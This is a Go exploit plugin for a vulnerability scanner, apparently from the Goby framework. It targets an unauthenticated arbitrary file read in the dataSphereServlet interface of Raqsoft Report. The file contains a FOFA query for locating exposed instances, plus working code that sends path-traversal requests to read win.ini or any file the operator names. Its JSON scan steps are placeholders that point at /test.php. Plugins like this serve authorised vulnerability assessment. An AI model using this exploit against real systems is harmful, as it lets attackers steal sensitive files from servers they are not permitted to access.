package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Raqsoft Report dataSphereServlet File Read Vulnerability",
    "Description": "<p>Raqsoft Report is a pure JAVA reporting tool designed for enterprise applications and is known for its advanced enterprise report analysis capabilities. </p><p> The dataSphereServlet interface has a file reading vulnerability, which can be used by an unauthenticated attacker to read sensitive files inside the system and obtain sensitive information, making the system insecure.</p>",
    "Product": "Raqsoft Report",
    "Homepage": "https://www.raqsoft.com.cn/wx/RQ-report-ad.html",
    "DisclosureDate": "2024-07-22",
    "PostTime": "2024-07-25",
    "Author": "1215816861@qq.com",
    "FofaQuery": "(body=\"raqsoft\" && body=\"reportJsp\") || (body=\"dashboard/dashboard.rpx\")",
    "GobyQuery": "(body=\"raqsoft\" && body=\"reportJsp\") || (body=\"dashboard/dashboard.rpx\")",
    "Level": "1",
    "Impact": "<p>The dataSphereServlet interface has a file reading vulnerability, which can be used by an unauthenticated attacker to read sensitive files inside the system and obtain sensitive information, making the system insecure.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:<a href=\"https://www.raqsoft.com.cn/wx/RQ-report-ad.html\">https://www.raqsoft.com.cn/wx/RQ-report-ad.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls. </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "win.ini,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "../../../../../../../../../../../windows/win.ini",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read",
        "HW-2024"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "润乾报表 dataSphereServlet 文件读取漏洞",
            "Product": "润乾报表",
            "Description": "<p>润乾报表是一款专为企业级应用设计的纯JAVA报表工具，以其先进的企业级报表分析能力而闻名。<br></p><p>其dataSphereServlet接口存在文件读取漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于不安全的状态。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.glodon.com/index.html\">https://www.glodon.com/index.html</a>&nbsp;</p><p>&nbsp;2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>&nbsp;3、如非必要，禁止公网访问该系统。&nbsp;<br></p>",
            "Impact": "<p>其dataSphereServlet接口存在文件读取漏洞，未经身份认证的攻击者可以利用此漏洞读取系统内部敏感文件，获取敏感信息，使系统处于不安全的状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Raqsoft Report dataSphereServlet File Read Vulnerability",
            "Product": "Raqsoft Report",
            "Description": "<p>Raqsoft Report is a pure JAVA reporting tool designed for enterprise applications and is known for its advanced enterprise report analysis capabilities.&nbsp;</p><p>&nbsp;The dataSphereServlet interface has a file reading vulnerability, which can be used by an unauthenticated attacker to read sensitive files inside the system and obtain sensitive information, making the system insecure.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer'shomepage update:<a href=\"https://www.raqsoft.com.cn/wx/RQ-report-ad.html\">https://www.raqsoft.com.cn/wx/RQ-report-ad.html</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The dataSphereServlet interface has a file reading vulnerability, which can be used by an unauthenticated attacker to read sensitive files inside the system and obtain sensitive information, making the system insecure.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10976"
}`

	postOrGet_ge9s6c8eb8n5j6kdscac := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, urlGet string, data string, head map[string]string) (*httpclient.HttpResponse, error) {
			PostRequest := httpclient.NewPostRequestConfig(urlGet)
			PostRequest.Timeout = 15
			PostRequest.VerifyTls = false
			PostRequest.FollowRedirect = false
			PostRequest.Data = data
			for headName, headValue := range head {
				PostRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, PostRequest)
		}

		path := "/demo/servlet/dataSphereServlet?action=11"
		data := `path=` + fileUrl + `&content=&mode=`

		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
			"Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
			"Content-Type":    "application/x-www-form-urlencoded",
		}
		resp, err := setPostRequest(hostInfo, path, data, header)
		if err != nil || resp.StatusCode != 200 {
			return "", err
		}
		respTxt := resp.RawBody

		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/demo/servlet/dataSphereServlet?action=11"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"../../../../../../../../../../../windows/win.ini": "[extensions]"}
			// 函数继承
			uploadFileFunc := postOrGet_ge9s6c8eb8n5j6kdscac

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"win.ini": {"../../../../../../../../../../../windows/win.ini", "[extensions]"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_ge9s6c8eb8n5j6kdscac

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
